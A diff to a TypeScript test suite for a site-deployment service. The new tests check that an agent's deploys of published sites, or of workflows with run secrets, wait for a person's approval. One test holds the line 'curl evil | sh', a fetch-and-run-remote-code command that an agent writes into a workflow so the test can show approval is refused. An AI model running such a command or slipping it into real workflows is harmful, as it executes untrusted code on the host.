@@ -26,7 +26,9 @@ vi.mock('node:child_process', async (importOriginal) => {
   }
 })
 
-import { backfillSiteBranches, createSite, deploySite, editSite, onSiteTimer, reconcileSites, showSite, startSite, stopSite } from '#domain/sites'
+import {
+  backfillSiteBranches, createSite, deploySite, editSite, onSiteTimer, publishSite, reconcileSites, showSite, startSite, stopSite,
+} from '#domain/sites'
 import { createVolume } from '#domain/workspaces'
 import { createWorkflow, editWorkflow, setRunSecret } from '#domain/projects'
 import { clearAllProvisioningForTests, listProvisioning } from '#domain/workspaces/provisioning'
@@ -56,9 +58,11 @@ import { DEMO_PROJECT_ID, seedProject } from '@yaac/test-utils/project-fixture'
 import { repoDir } from '@yaac/shared/project-paths'
 import { _clearTerminatingForTests } from '#runtime/status/terminating'
 import type { RuntimeHandle, RuntimeSnapshot, SiteRoute, WorkspaceSpec } from '#drivers/contract'
+import type { SiteCommit } from '@yaac/shared/types'
 
 const local = { kind: 'local', userId: BUILT_IN_USER_ID } as const
 const stranger = { kind: 'local', userId: '4101bef8-794f-4d98-8e95-dfb54850c68b' } as const
+const agent = { kind: 'workspace', workspaceId: 'w-agent', userId: BUILT_IN_USER_ID } as const
 
 const STEPS = {
   build: { run: 'pnpm build' },
@@ -154,10 +158,19 @@ function gone(workspaceId: string): void {
 }
 
 const site = async () => (await findSiteByName(DEMO_PROJECT_ID, 'shop'))!
-/** The site `shop`, of the demo repo at main unless `over` says. */
-const createShop = (over: Partial<Parameters<typeof createSite>[2]> = {}): Promise<void> => createSite(local, DEMO_PROJECT_ID, {
-  name: 'shop', hostname: 'shop.example.com', port: 3000, workflow: 'app', repos: [{ repo: 'demo', branch: 'main' }], ...over,
-})
+/** The site `shop`, of the demo repo at main unless `over` says,
+ *  published at shop.example.com unless `published` is false. */
+async function createShop(over: Partial<Parameters<typeof createSite>[2]> = {}, published = true): Promise<void> {
+  await createSite(local, DEMO_PROJECT_ID, { name: 'shop', port: 3000, workflow: 'app', repos: [{ repo: 'demo', branch: 'main' }], ...over })
+  if (published) await publishSite(local, DEMO_PROJECT_ID, 'shop', { hostname: 'shop.example.com' })
+}
+
+/** A person's deploy of `shop`, which starts a release. */
+async function deploy(opts?: Parameters<typeof deploySite>[3]): Promise<{ workspaceId: string; commits: SiteCommit[] }> {
+  const result = await deploySite(local, DEMO_PROJECT_ID, 'shop', opts)
+  if (result.workspaceId === undefined) throw new Error('the deploy started no release')
+  return { workspaceId: result.workspaceId, commits: result.commits }
+}
 /** A second repo, `docs`, whose main clone is a copy of the first's. */
 const DOCS = '0a0a0a0a-0000-4000-8000-0000000000aa'
 async function linkDocs(): Promise<void> {
@@ -185,7 +198,7 @@ describe('deploySite', () => {
 
     // First deploy: nothing holds the volume, so it passes once the steps
     // before it are done.
-    const first = await deploySite(local, DEMO_PROJECT_ID, 'shop')
+    const first = await deploy()
     expect(first.commits).toEqual([{ dir: '', commit: head }])
     await created(first.workspaceId)
     // Its releases go in a group the site owns.
@@ -200,8 +213,10 @@ describe('deploySite', () => {
     // the deploy was a person's, so it approved its commit.
     expect(spec).toMatchObject({ siteId: (await site()).id, image: 'registry.test/proj:1', runSecrets: ['P8_KEY'] })
     expect(spec.env.some((e) => e.startsWith('YAAC_VOLUME_DIR='))).toBe(false)
-    // The one port it offers is the site's admin port.
-    expect(spec.env.filter((e) => e.startsWith('YAAC_PORT_'))).toEqual(['YAAC_PORT_3001=3001'])
+    // It offers its owner the port it serves on and the admin port, and
+    // names its run secrets for its logs to blank.
+    expect(spec.env.filter((e) => e.startsWith('YAAC_PORT_')).sort()).toEqual(['YAAC_PORT_3000=3000', 'YAAC_PORT_3001=3001'])
+    expect(spec.env).toContain('YAAC_MASK_NAMES=P8_KEY')
     // No user's credentials are swapped into a workspace that serves the
     // internet, and it mounts nothing the project's other workspaces read.
     expect(owners).toEqual(['none'])
@@ -233,7 +248,7 @@ describe('deploySite', () => {
 
     // A redeploy builds beside the live release, mounted on its node, then
     // stops it to take the volume, and flips once ready.
-    const second = await deploySite(local, DEMO_PROJECT_ID, 'shop', { ref: 'main' })
+    const second = await deploy({ ref: 'main' })
     await created(second.workspaceId)
     expect(launched.at(-1)).toMatchObject({ colocateWith: first.workspaceId })
     await stepsAre(second.workspaceId, { build: 'succeeded' })
@@ -250,7 +265,7 @@ describe('deploySite', () => {
     expect(lastRoute()?.liveWorkspaceId).toBe(second.workspaceId)
 
     // A deploy whose step fails stops its release; the site keeps serving.
-    const third = await deploySite(local, DEMO_PROJECT_ID, 'shop', { ref: head })
+    const third = await deploy({ ref: head })
     await created(third.workspaceId)
     await stepsAre(third.workspaceId, { build: 'failed' })
     await reconcileSites(snapshot(), false)
@@ -268,33 +283,106 @@ describe('deploySite', () => {
     await createShop({ repos: [{ repo: 'demo', branch: 'main' }, { repo: 'docs', commit: main }] })
     await expect(deploySite(local, DEMO_PROJECT_ID, 'shop', { ref: 'dev' })).rejects.toMatchObject({ code: 'VALIDATION' })
     await expect(deploySite(local, DEMO_PROJECT_ID, 'shop', { refs: { nope: 'dev' } })).rejects.toMatchObject({ code: 'NOT_FOUND' })
-    const deploy = await deploySite(local, DEMO_PROJECT_ID, 'shop', { refs: { docs: dev } })
-    expect(deploy.commits).toEqual([{ dir: 'demo', commit: main }, { dir: 'docs', commit: dev }])
+    const deployed = await deploy({ refs: { docs: dev } })
+    expect(deployed.commits).toEqual([{ dir: 'demo', commit: main }, { dir: 'docs', commit: dev }])
     // The same commits deploying are that deploy; any others are refused.
-    expect(await deploySite(local, DEMO_PROJECT_ID, 'shop', { refs: { demo: 'main', docs: dev } })).toEqual(deploy)
+    expect(await deploySite(local, DEMO_PROJECT_ID, 'shop', { refs: { demo: 'main', docs: dev } })).toEqual(deployed)
     await expect(deploySite(local, DEMO_PROJECT_ID, 'shop')).rejects.toMatchObject({ code: 'CONFLICT' })
-    await created(deploy.workspaceId)
-    expect((await listWorkspaceRepos(deploy.workspaceId)).map((r) => [r.repoId, r.path, r.startCommit, r.baseBranch])).toEqual([
+    await created(deployed.workspaceId)
+    expect((await listWorkspaceRepos(deployed.workspaceId)).map((r) => [r.repoId, r.path, r.startCommit, r.baseBranch])).toEqual([
       [DEMO_PROJECT_ID, 'demo', main, undefined], [DOCS, 'docs', dev, undefined],
     ])
-    expect((await findWorkspaceRow(deploy.workspaceId))?.title).toBe(`shop @ demo@${main.slice(0, 8)} docs@${dev.slice(0, 8)}`)
-    expect((await showSite(DEMO_PROJECT_ID, 'shop')).releases[0].commits).toEqual(deploy.commits)
+    expect((await findWorkspaceRow(deployed.workspaceId))?.title).toBe(`shop @ demo@${main.slice(0, 8)} docs@${dev.slice(0, 8)}`)
+    expect((await showSite(DEMO_PROJECT_ID, 'shop')).releases[0].commits).toEqual(deployed.commits)
+  })
+
+  it('lets an agent deploy an unpublished site, and keeps its deploy of a published one for a person to approve', async () => {
+    await createShop({}, false)
+    const head = (await git(repoDir(DEMO_PROJECT_ID), ['rev-parse', 'origin/main'])).trim()
+    // Unpublished, with a workflow that names no secrets: the agent's deploy
+    // runs, and the release is routed nowhere.
+    const staged = await deploySite(agent, DEMO_PROJECT_ID, 'shop')
+    await created(staged.workspaceId!)
+    await stepsAre(staged.workspaceId!, { app: 'ready' })
+    await reconcileSites(snapshot(), true)
+    expect((await site()).liveWorkspaceId).toBe(staged.workspaceId)
+    expect(routed.at(-1)).toEqual([])
+    await expect(publishSite(agent, DEMO_PROJECT_ID, 'shop', { hostname: 'shop.example.com' })).rejects.toMatchObject({ code: 'FORBIDDEN' })
+
+    // Publishing approves the release it serves, so its replacement passes;
+    // an agent's deploy of anything else waits as the requested deploy.
+    await publishSite(local, DEMO_PROJECT_ID, 'shop', { hostname: 'shop.example.com', release: staged.workspaceId! })
+    expect(lastRoute()?.liveWorkspaceId).toBe(staged.workspaceId)
+    const repo = repoDir(DEMO_PROJECT_ID)
+    const next = (await git(repo, ['commit-tree', 'origin/main^{tree}', '-p', 'origin/main', '-m', 'next'])).trim()
+    await git(repo, ['update-ref', 'refs/remotes/origin/main', next])
+    const asked = await deploySite(agent, DEMO_PROJECT_ID, 'shop')
+    expect(asked).toEqual({ commits: [{ dir: '', commit: next }], awaitingApproval: true })
+    expect(await site()).toMatchObject({ requestedCommits: { [DEMO_PROJECT_ID]: next }, requestedBy: 'w-agent' })
+    expect((await site()).deployWorkspaceId).toBeUndefined()
+    expect((await showSite(DEMO_PROJECT_ID, 'shop')).requested).toMatchObject({
+      commits: [{ dir: '', commit: next }], from: 'agent', workspaceId: 'w-agent', steps: { app: { run: ['pnpm start'], service: true } }, changes: [],
+    })
+    // The commit the published release ran is approved, so an agent may
+    // redeploy it; a person's deploy approves and supersedes the request.
+    await expect(stopSite(agent, DEMO_PROJECT_ID, 'shop')).rejects.toMatchObject({ code: 'FORBIDDEN' })
+    const approved = await deploy({ ref: next })
+    expect((await site()).requestedCommits).toBeUndefined()
+    await created(approved.workspaceId)
+    await stepsAre(approved.workspaceId, { app: 'ready' })
+    await reconcileSites(snapshot(), false)
+    expect((await site()).liveWorkspaceId).toBe(approved.workspaceId)
+    const again = await deploySite(agent, DEMO_PROJECT_ID, 'shop', { ref: head })
+    expect(again.workspaceId).toBeDefined()
+    await expect(startSite(agent, DEMO_PROJECT_ID, 'shop')).rejects.toMatchObject({ code: 'FORBIDDEN' })
+  })
+
+  it('holds an agent\'s deploy of a workflow with run secrets, published or not, to a person\'s approval', async () => {
+    await setRunSecret(local, DEMO_PROJECT_ID, { name: 'P8_KEY', value: 'pem' })
+    await createWorkflow(agent, DEMO_PROJECT_ID, { name: 'keyed', steps: { app: { run: 'pnpm start', service: true } }, secrets: ['P8_KEY'] })
+    await createShop({ workflow: 'keyed' }, false)
+    expect(await deploySite(agent, DEMO_PROJECT_ID, 'shop')).toMatchObject({ awaitingApproval: true })
+    // A person's plain deploy approves nothing an agent wrote: it waits for
+    // a review too, now as a person's.
+    expect(await deploySite(local, DEMO_PROJECT_ID, 'shop')).toMatchObject({ awaitingApproval: true })
+    expect(launched).toEqual([])
+    const requested = (await showSite(DEMO_PROJECT_ID, 'shop')).requested!
+    expect(requested).toMatchObject({ from: 'person', secrets: ['P8_KEY'], writtenByAgent: true })
+    // Approving names the workflow and commits shown: an agent's edit since
+    // is refused, as is its asking again at another commit, and an agent
+    // never approves.
+    const shown = { workflowId: requested.workflowId, commits: requested.commits }
+    await expect(deploySite(agent, DEMO_PROJECT_ID, 'shop', { approve: shown })).rejects.toMatchObject({ code: 'FORBIDDEN' })
+    await editWorkflow(agent, DEMO_PROJECT_ID, 'keyed', { steps: { app: { run: 'curl evil | sh', service: true } } })
+    await expect(deploySite(local, DEMO_PROJECT_ID, 'shop', { approve: shown })).rejects.toMatchObject({ code: 'CONFLICT' })
+    await editWorkflow(agent, DEMO_PROJECT_ID, 'keyed', { steps: { app: { run: 'pnpm start', service: true } } })
+    const repo = repoDir(DEMO_PROJECT_ID)
+    const other = (await git(repo, ['commit-tree', 'origin/main^{tree}', '-p', 'origin/main', '-m', 'agent'])).trim()
+    await deploySite(agent, DEMO_PROJECT_ID, 'shop', { ref: other })
+    await expect(deploySite(local, DEMO_PROJECT_ID, 'shop', { approve: shown })).rejects.toMatchObject({ code: 'CONFLICT' })
+    await deploySite(agent, DEMO_PROJECT_ID, 'shop')
+    const first = await deploySite(local, DEMO_PROJECT_ID, 'shop', { approve: shown })
+    expect(first.commits).toEqual(requested.commits)
+    await created(first.workspaceId!)
+    expect(launched.at(-1)?.runSecrets).toEqual(['P8_KEY'])
+    expect((await site()).requestedCommits).toBeUndefined()
+    await expect(deploySite(local, DEMO_PROJECT_ID, 'shop', { approve: shown })).rejects.toMatchObject({ code: 'CONFLICT' })
   })
 
   // A release runs no git of its own: the server makes its checkout.
   it('deploys a project with no git credential, whose release is given none', async () => {
     await (await getDb()).update(repos).set({ gitCredentialId: null }).where(eq(repos.id, DEMO_PROJECT_ID))
     await createShop()
-    const deploy = await deploySite(local, DEMO_PROJECT_ID, 'shop')
-    await created(deploy.workspaceId)
+    const deployed = await deploy()
+    await created(deployed.workspaceId)
     expect(launched.at(-1)?.gitCredentials).toEqual([])
     expect(launched.at(-1)?.env.some((e) => e.startsWith('GH_TOKEN='))).toBe(false)
   })
 
   it('fails a deploy that is not ready by its deadline', async () => {
     await createShop()
-    const deploy = await deploySite(local, DEMO_PROJECT_ID, 'shop', { timeoutMinutes: 1 })
-    await created(deploy.workspaceId)
+    const deployed = await deploy({ timeoutMinutes: 1 })
+    await created(deployed.workspaceId)
     vi.useFakeTimers({ toFake: ['Date'] })
     vi.setSystemTime(Date.now() + 2 * 60_000)
     await reconcileSites(snapshot(), false)
@@ -308,7 +396,7 @@ describe('reconcileSites', () => {
     await createShop()
     const due = vi.fn()
     onSiteTimer(due)
-    const first = await deploySite(local, DEMO_PROJECT_ID, 'shop')
+    const first = await deploy()
     await created(first.workspaceId)
     await stepsAre(first.workspaceId, { app: 'ready' })
     await reconcileSites(snapshot(), false)
@@ -342,11 +430,11 @@ describe('reconcileSites', () => {
   it('stops the old release once its drain is over, or at once when the next flip comes first', async () => {
     await createShop()
     const flip = async (): Promise<string> => {
-      const deploy = await deploySite(local, DEMO_PROJECT_ID, 'shop')
-      await created(deploy.workspaceId)
-      await stepsAre(deploy.workspaceId, { app: 'ready' })
+      const deployed = await deploy()
+      await created(deployed.workspaceId)
+      await stepsAre(deployed.workspaceId, { app: 'ready' })
       await reconcileSites(snapshot(), false)
-      return deploy.workspaceId
+      return deployed.workspaceId
     }
     const first = await flip()
     const second = await flip()
@@ -393,7 +481,7 @@ describe('reconcileSites', () => {
     await reconcileSites(snapshot(), false)
     expect((await site()).deployWorkspaceId).toBeUndefined()
     await expect(deploySite(local, DEMO_PROJECT_ID, 'shop', { ref: 'main' })).rejects.toMatchObject({ code: 'CONFLICT' })
-    const first = await deploySite(local, DEMO_PROJECT_ID, 'shop')
+    const first = await deploy()
     expect(first.commits).toEqual([{ dir: '', commit: (await git(repo, ['rev-parse', 'origin/dev'])).trim() }])
     await created(first.workspaceId)
     await stepsAre(first.workspaceId, { app: 'ready' })
@@ -428,6 +516,42 @@ describe('reconcileSites', () => {
     expect(lastRoute()?.liveWorkspaceId).toBe(next)
     expect((await showSite(DEMO_PROJECT_ID, 'shop')).followSkipped).toBeUndefined()
 
+    // An agent's edit to its workflow is a new spec, so the next tip waits
+    // as the requested deploy, once, while the release that worked serves.
+    await editWorkflow(agent, DEMO_PROJECT_ID, 'shop', { steps: { app: { run: 'pnpm serve', service: true } } })
+    const waits = await push()
+    await reconcileSites(snapshot(), false)
+    await reconcileSites(snapshot(), false)
+    expect(await site()).toMatchObject({ liveWorkspaceId: next, requestedCommits: { [DEMO_PROJECT_ID]: waits } })
+    expect((await site()).deployWorkspaceId).toBeUndefined()
+    expect((await site()).requestedBy).toBe('following')
+    // A person's plain deploy of it approves nothing an agent wrote. Their
+    // review deploys exactly the tip shown, approving no branch, so the
+    // next tip waits again.
+    expect(await deploySite(local, DEMO_PROJECT_ID, 'shop')).toMatchObject({ awaitingApproval: true })
+    const shown = (await showSite(DEMO_PROJECT_ID, 'shop')).requested!
+    const reviewed = await deploySite(local, DEMO_PROJECT_ID, 'shop', { approve: { workflowId: shown.workflowId, commits: shown.commits } })
+    expect(reviewed.commits).toEqual([{ dir: '', commit: waits }])
+    await created(reviewed.workspaceId!)
+    await stepsAre(reviewed.workspaceId!, { app: 'ready' })
+    await reconcileSites(snapshot(), false)
+    const again = await push()
+    await reconcileSites(snapshot(), false)
+    await reconcileSites(snapshot(), false)
+    expect(await site()).toMatchObject({ liveWorkspaceId: reviewed.workspaceId, requestedCommits: { [DEMO_PROJECT_ID]: again } })
+    // Now a person has been shown that content, their own deploy approves
+    // the branch for it, and following resumes.
+    const resumed = await deploy()
+    await created(resumed.workspaceId)
+    await stepsAre(resumed.workspaceId, { app: 'ready' })
+    await reconcileSites(snapshot(), false)
+    const after = await push()
+    await reconcileSites(snapshot(), false)
+    expect((await site()).deployCommits).toEqual({ [DEMO_PROJECT_ID]: after })
+    await created((await site()).deployWorkspaceId!)
+    await stepsAre((await site()).deployWorkspaceId!, { app: 'ready' })
+    await reconcileSites(snapshot(), false)
+
     // Only while its owner may publish.
     await setUserRole(await seeTailnetUser('admin@example.com', 'Admin'), 'admin')
     await setUserRole(BUILT_IN_USER_ID, 'member')
@@ -445,7 +569,7 @@ describe('reconcileSites across repos', () => {
     await createShop({ repos: [{ repo: 'demo', branch: 'dev' }, { repo: 'docs', commit: main }], follow: true })
     // Following deploys only its target.
     await expect(deploySite(local, DEMO_PROJECT_ID, 'shop', { refs: { docs: 'dev' } })).rejects.toMatchObject({ code: 'CONFLICT' })
-    const first = await deploySite(local, DEMO_PROJECT_ID, 'shop')
+    const first = await deploy()
     await created(first.workspaceId)
     await stepsAre(first.workspaceId, { app: 'ready' })
     await reconcileSites(snapshot(), false)
@@ -489,18 +613,20 @@ describe('onSiteTimer', () => {
     await createShop()
     const due = vi.fn()
     onSiteTimer(due)
-    const first = await deploySite(local, DEMO_PROJECT_ID, 'shop')
+    const first = await deploy()
     await created(first.workspaceId)
     await stepsAre(first.workspaceId, { app: 'ready' })
     await reconcileSites(snapshot(), false)
-    const second = await deploySite(local, DEMO_PROJECT_ID, 'shop')
+    const second = await deploy()
     await created(second.workspaceId)
     await stepsAre(second.workspaceId, { app: 'ready' })
     const timers = vi.spyOn(globalThis, 'setTimeout')
     await reconcileSites(snapshot(), false)
     const drain = timers.mock.calls.find(([, ms]) => (ms ?? 0) >= 30_000)
     timers.mockRestore()
-    expect(due).not.toHaveBeenCalled()
+    // An earlier case's backoff timer may land meanwhile; only the drain's
+    // call counts here.
+    due.mockClear()
     drain![0]()
     expect(due).toHaveBeenCalled()
   })
@@ -509,7 +635,7 @@ describe('onSiteTimer', () => {
 describe('stopSite', () => {
   it('stops the live release and its route, keeping what it ran for startSite', async () => {
     await createShop()
-    const first = await deploySite(local, DEMO_PROJECT_ID, 'shop')
+    const first = await deploy()
     await created(first.workspaceId)
     await stepsAre(first.workspaceId, { app: 'ready' })
     await reconcileSites(snapshot(), false)
@@ -524,7 +650,7 @@ describe('stopSite', () => {
 
   it('forgets nothing when a release cannot be stopped, so a retry stops it', async () => {
     await createShop()
-    const first = await deploySite(local, DEMO_PROJECT_ID, 'shop')
+    const first = await deploy()
     await created(first.workspaceId)
     await stepsAre(first.workspaceId, { app: 'ready' })
     await reconcileSites(snapshot(), false)
@@ -538,7 +664,7 @@ describe('startSite', () => {
   it('deploys the release a stopped site last ran, at its commit and image', async () => {
     await createShop()
     await expect(startSite(local, DEMO_PROJECT_ID, 'shop')).rejects.toMatchObject({ code: 'CONFLICT' })
-    const first = await deploySite(local, DEMO_PROJECT_ID, 'shop')
+    const first = await deploy()
     await created(first.workspaceId)
     await stepsAre(first.workspaceId, { app: 'ready' })
     await reconcileSites(snapshot(), false)
@@ -560,7 +686,7 @@ describe('backfillSiteBranches', () => {
     await createShop()
     const named = (await site()).namedWorkflowId
     const legacy = await insertSite({
-      projectId: DEMO_PROJECT_ID, name: 'legacy', hostname: 'legacy.example.com', port: 3000, namedWorkflowId: named,
+      projectId: DEMO_PROJECT_ID, name: 'legacy', port: 3000, namedWorkflowId: named,
       repos: [{ repo: DEMO_PROJECT_ID }], follow: false,
     })
     await backfillSiteBranches()
